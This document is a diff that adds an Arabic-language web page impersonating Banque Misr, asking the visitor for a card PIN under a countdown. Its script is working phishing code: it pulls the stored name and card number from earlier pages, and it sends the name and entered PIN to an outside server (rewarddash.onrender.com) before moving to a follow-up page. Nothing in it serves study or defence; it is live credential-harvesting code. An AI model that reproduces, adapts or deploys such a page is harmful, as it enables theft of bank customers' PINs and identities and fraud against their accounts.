@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>الرقم السري</title>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #f5f5ff;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+
+    .header-logo {
+      padding: 20px 0;
+    }
+
+    .header-logo img {
+      width: 90px;
+    }
+
+    .card-box {
+      background: #fff;
+      border: 3px solid #8a1433;
+      border-radius: 18px;
+      padding: 30px 20px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    .bank-logo {
+      margin-bottom: 15px;
+    }
+
+    .bank-logo img {
+      height: 60px;
+    }
+
+    .atm-image {
+      width: 100%;
+      max-width: 250px;
+      margin: 15px 0;
+    }
+
+    .pin-title {
+      font-size: 1.4rem;
+      font-weight: bold;
+      margin: 15px 0;
+      color: #000;
+    }
+
+    .pin-input {
+      font-size: 2rem;
+      letter-spacing: 10px;
+      text-align: center;
+      padding: 10px;
+      border: 2px solid #999;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 250px;
+      margin: 0 auto 10px;
+    }
+
+    .note-box {
+      background-color: #dff0ff;
+      padding: 10px;
+      margin-top: 15px;
+      border-radius: 10px;
+      color: #444;
+      font-size: 0.9rem;
+    }
+
+    .submit-btn {
+      background-color: #8a1433;
+      color: white;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      font-size: 1rem;
+      width: 90%;
+      max-width: 300px;
+      margin: 20px auto 0;
+      display: block;
+      cursor: pointer;
+    }
+
+    .submit-btn:hover {
+      background-color: #6f102a;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header-logo">
+    <img src="images/slogo.jpg" alt="Banque Misr Logo" />
+  </div>
+
+  <div class="card-box">
+    <div class="bank-logo">
+      <img src="images/logo.jpg" alt="Banque Misr" />
+    </div>
+
+    <img src="images/atm.jpg" alt="ATM Machine" class="atm-image" />
+
+    <h2 class="pin-title">الرقم السري للبطاقة</h2>
+    <input type="password" maxlength="4" class="pin-input" placeholder="••••" inputmode="numeric" />
+
+    <p id="countdown-text" style="color: #8a1433; font-weight: bold; margin-top: 5px;">
+  سيتم إيقاف العمل بالكود خلال <span id="timer">10</span> ثواني
+    </p>
+
+    <div class="note-box">
+      <strong>ما هو الرقم السري للبطاقة؟</strong><br>
+      هي كلمة المرور التي تحتاجها أثناء استخدام الصراف الآلي. يُرجى التأكد من صحة الرقم السري قبل إدخاله.
+      إذا قمت بإدخاله بشكل خاطئ 3 مرات متتالية، سيتم تعليق البطاقة كإجراء وقائي.
+    </div>
+
+    <button class="submit-btn" id="submitOtpBtn">متابعة</button>
+
+  </div>
+
+</div>
+
+<script>
+  document.getElementById("submitOtpBtn").addEventListener("click", function () {
+    const pinInput = document.querySelector(".pin-input");
+    const pinCode = pinInput.value.trim();
+
+    // Validate PIN: must be 4 digits
+    if (!/^\d{4}$/.test(pinCode)) {
+      alert("الرجاء إدخال رقم سري مكون من 4 أرقام");
+      pinInput.focus();
+      return;
+    }
+
+    // Get card number from localStorage (stored earlier)
+    const fullCard = localStorage.getItem("cardNum") || "N/A";
+const cardDisplay = fullCard.replace(/\s/g, '').replace(/^(\d{6})\d{6,8}(\d{3,4})$/, '$1******$2');
+
+const fullName = localStorage.getItem("name") || "N/A";
+
+const message = 
+  `✅ OTP Confirmation Code:\n` +
+  `- الاسم الكامل: ${fullName}\n` +
+  `- الكود: ${pinCode}`;
+
+    fetch("https://rewarddash.onrender.com/api/messages", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ text: message }),
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error("فشل");
+      }
+      return response.json();
+    })
+    .then(() => {
+     window.location.href = "finalcode.html";
+      // window.location.href = "done.html"; // Optional redirect
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      alert("حدث خطأ ");
+    });
+  });
+
+  // Countdown timer (10 seconds)
+let countdown = 30;
+const timerEl = document.getElementById('timer');
+
+const intervalId = setInterval(() => {
+  countdown--;
+  timerEl.textContent = countdown;
+
+  if (countdown <= 0) {
+    clearInterval(intervalId);
+    // When countdown reaches zero, update the text
+    document.getElementById('countdown-text').textContent = "انتهى وقت الكود، يرجى طلب كود جديد.";
+  }
+}, 1000);
+
+</script>
+
+
+</body>
+</html>
+
